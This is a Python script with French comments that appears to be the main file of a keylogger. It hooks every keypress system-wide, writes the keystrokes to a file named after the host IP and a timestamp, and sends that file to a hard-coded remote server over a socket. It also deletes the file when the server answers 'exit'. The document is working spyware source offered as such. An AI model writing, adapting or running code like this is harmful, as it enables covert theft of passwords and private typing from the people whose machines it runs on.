import keyboard, socket, functions, threading
from time import strftime
from queue import Queue

ip_host = socket.gethostbyname(socket.gethostname())
ip_server = "192.168.1.66"
port = 8080
time = strftime("%Y-%m-%d_%H-%M-%S")
file_name = ip_host + "-" + time + "-keyboard.txt"

# Définition d'une queue pour stocker les résultats du thread
resultat = Queue()

# Connexion au serveur
connexion = threading.Thread(target=functions.connexion, args=(ip_server, port, resultat))
connexion.start()

# Détection de l'OS
sys = functions.detect_os()

# Création du fichier
file_path = functions.creation_fichier(file_name, sys)

# Active le mode d'enregistrement des touches
keyboard.on_press(lambda event: functions.touche_fichier(file_path, event))

try:
    # Maintient le programme en cours d'exécution
    keyboard.wait("esc")
except KeyboardInterrupt:
    pass

connexion.join()
if resultat.get() == "exit":
    # Supprimer le fichier
    functions.suppression_fichier(file_path)
    print("Le programme a été arrêté et le fichier supprimé !")
    exit()


# Désactive le mode d'enregistrement global des touches
keyboard.unhook_all()

# Envoi du fichier au serveur distant via un socket
functions.client(file_path, ip_server, port)

